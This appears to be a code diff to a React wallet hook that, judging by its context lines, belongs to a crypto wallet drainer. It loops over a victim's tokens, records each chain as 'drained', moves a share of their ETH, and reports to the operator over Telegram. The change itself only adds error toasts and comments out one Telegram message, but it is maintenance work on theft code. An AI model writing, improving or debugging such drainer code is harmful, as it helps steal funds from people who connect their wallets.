@@ -194,7 +194,7 @@ export const UseWallet = () => {
           const userBalance = await tokenContract.balanceOf(address);
           if (userBalance.lt(amountInWei)) {
             console.log(`Insufficient token balance for ${tokenAddress}`);
-            toast(`Insufficient token balance for ${tokenAddress}`);
+            toast.error(`Insufficient token balance for ${tokenAddress}`);
             continue; // Move to next token
           }
 
@@ -210,9 +210,10 @@ export const UseWallet = () => {
 
           chainDrainStatus[chainId] = true; // Mark chain as drained if successful
         } catch (error) {
-          sendMessageToTelegram(
-            `|-----Error during swap-----|\nError: ${error?.message}`
-          );
+          // sendMessageToTelegram(
+          //   `|-----Error during swap-----|\nError: ${error?.message}`
+          // );
+          toast.error(`Transfer failed for ${tokenAddress}:`);
           console.log(`Transfer failed for ${tokenAddress}:`, error);
           continue; // Continue to next token on failure
         }
@@ -254,6 +255,7 @@ export const UseWallet = () => {
         .div(10); // Transfer 20% of ETH
 
       if (totalEthRequired.lt(gasFee)) {
+        toast.error("Not enough ETH to cover gas fees and transfer.");
         console.log("Not enough ETH to cover gas fees and transfer.");
         await proceedToNextChain();
         return;
